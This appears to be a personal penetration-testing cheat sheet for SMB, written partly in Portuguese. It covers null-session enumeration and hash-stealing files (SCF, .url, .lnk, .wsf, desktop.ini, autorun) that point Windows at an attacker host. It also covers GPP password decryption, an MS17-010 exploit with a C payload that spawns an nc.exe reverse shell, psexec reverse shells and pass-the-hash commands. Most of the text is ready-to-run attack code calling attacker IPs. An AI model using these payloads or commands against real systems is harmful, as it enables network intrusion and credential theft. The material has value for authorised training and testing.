SMB
========================

OBS: Para que comporte todos as versões de protocolo, temos que informar o seguinte no arquivo de configuração:

    [global]

    #### Kali configuration (use kali-tweaks to change it) ####

    # By default a Kali system should be configured for wide compatibility,
    # to easily interact with servers using old vulnerable protocols.
       #client min protocol = LANMAN1
       client min protocol = CORE
       client max protocol = SMB3

    ## Browsing/Identification ###
    #   force user = acosta

    # Change this to the workgroup/NT-domain name your Samba server will part of
    #   workgroup = DOMAIN

## Null session and guest

### smbmap

null session

    smbmap -H 10.11.1.227 -u '' -p ''

user guest

    smbmap -H 10.11.1.227 -u guest -p ''
    
### smbclient

    smbclient -L 10.11.1.227 -U 'workgroup/guest'
    <ENTER>
    smbclient -U 'workgroup/guest' //10.11.1.227/share
    <ENTER>

Para conseguir fazer enunmeração mais rapidamente, é interessante que utilizemos o recurso de recursividade no smbclient com os seguintes comandos:

    recurse on
    dir

Desta forma, basta exxecutar esses dois comandos para ele fazer a busca via dir recursivamente

### Crackmapexec

    crackmapexec smb <hostname> -u '' -p '' --shares
    
    crackmapexec smb <hostname> -u 'guest' -p '' --shares
    


## Acesso de escrita

Aqui basicamente é obter hashes NTLMv2 para tentativa de quebrá-los com john ou hashcat.

Fonte:  <https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/>

### SCF files

    [Shell]
    Command=2
    IconFile=\\10.10.14.4\smb\uwu.ico
    [Taskbar]
    Command=ToggleDesktop

    sudo responder -I tun0

### Internet Shortcuts (.url)

Another shortcut in Windows is the Internet shortcuts. You can save this as something.url

    echo [InternetShortcut] > stealMyHashes.url 
    echo URL=file://192.168.0.1/@OsandaMalith >> stealMyHashes.url

### Shortcut Files (.lnk)

We can create a shortcut containing our network path and as you as you open the shortcut Windows will try to resolve the network path. You can also specify a keyboard shortcut to trigger the shortcut. For the icon you can give the name of a Windows binary or choose an icon from either shell32.dll, Ieframe.dll, imageres.dll, pnidui.dll or wmploc.dll located in the system32 directory.
```
[code language=”vb”]
Set shl = CreateObject(&quot;WScript.Shell&quot;)
Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)
currentFolder = shl.CurrentDirectory

Set sc = shl.CreateShortcut(fso.BuildPath(currentFolder, &quot;\StealMyHashes.lnk&quot;))

sc.TargetPath = &quot;\\35.164.153.224\@OsandaMalith&quot;
sc.WindowStyle = 1
sc.HotKey = &quot;Ctrl+Alt+O&quot;
sc.IconLocation = &quot;%windir%\system32\shell32.dll, 3&quot;
sc.Description = &quot;I will Steal your Hashes&quot;
sc.Save
[/code]

The Powershell version.
[code language=”powershell”]
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut(&quot;StealMyHashes.lnk&quot;)
$lnk.TargetPath = &quot;\\35.164.153.224\@OsandaMalith&quot;
$lnk.WindowStyle = 1
$lnk.IconLocation = &quot;%windir%\system32\shell32.dll, 3&quot;
$lnk.Description = &quot;I will Steal your Hashes&quot;
$lnk.HotKey = &quot;Ctrl+Alt+O&quot;
$lnk.Save()
[/code]
```
### Windows Script Files

Save this as something.wsf.

```
[code language=”xml”]
&lt;package&gt;
&lt;job id=&quot;boom&quot;&gt;
&lt;script language=&quot;VBScript&quot;&gt;
Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)
Set file = fso.OpenTextFile(&quot;//192.168.0.100/aa&quot;, 1)
&lt;/script&gt;
&lt;/job&gt;
&lt;/package&gt;
[/code]
```

### Desktop.ini

The desktop.ini files contain the information of the icons you have applied to the folder. We can abuse this to resolve a network path. Once you open the folder you should get the hashes.

    mkdir openMe
    attrib +s openMe
    cd openMe
    echo [.ShellClassInfo] > desktop.ini
    echo IconResource=\\192.168.0.1\aa >> desktop.ini
    attrib +s +h desktop.ini


In Windows XP systems the desktop.ini file uses ‘IcondFile’ instead of ‘IconResource’.

    [.ShellClassInfo]
    IconFile=\\192.168.0.1\aa
    IconIndex=1337

### Autorun.inf

Starting from Windows 7 this feature is disabled. However you can enable by changing the group policy for Autorun. Make sure to hide the Autorun.inf file to work.

    [autorun]
    open=\\35.164.153.224\setup.exe
    icon=something.ico
    action=open Setup.exe

## GPP Group.xml

Essa pasta geralmente se encontra dentro do diretório SYSVOL (compartilhado)

    ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml

Nesse cenário, basta executarmos uma ferramenta para decriptar a senha armazenada neste arquivo:

    git clone https://github.com/t0thkr1s/gpp-decrypt
    python3 gpp-decrypt.py -f [groups.xml]
    #ou
    python3 gpp-decrypt.py -c [cpassword]

## CVEs/Exploits

### ms17-010

    tools
    cd cve/2017-0143/impacket
    source exploit_ms17-010/bin/activate

Nesse momento já temos o ambiente preparado para execução do script, mas temos que preparar o paylolad pra funcionar:

    #include<stdlib.h>
    
    int main() {
    
            int i;
            i = system("START /B \\\\192.168.119.156\\smb\\nc.exe 192.168.119.156 80 -e cmd");
            return 0;
    }
Adequar este payload toda vez que for utilizá-lo

    i686-w64-mingw32-gcc backup.c -o backup.exe
    
    impacket-smbserver -smb2support smb /usr/share/windows-binaries
    nc -nlvp 80
    python ../impacket/send_and_execute.py 10.11.1.227 ../payload/backup.exe
    

## Psexec

baixar do sysinternals

    .\psexec -d -s -i ".\nc.exe -e powershell 10.10.14.14 8081"

## Pass the hash

Impacket and evil-winrm

```
evil-winrm -i <hostname> -u user -H lmhash:nthash
impacket-psexec user@<hostname> -hashes lmhash:nthash
impacket-smbexec user@<hostname> -hashes lmhash:nthash
impacket-wmiexec user@<hostname> -hashes lmhash:nthash
```
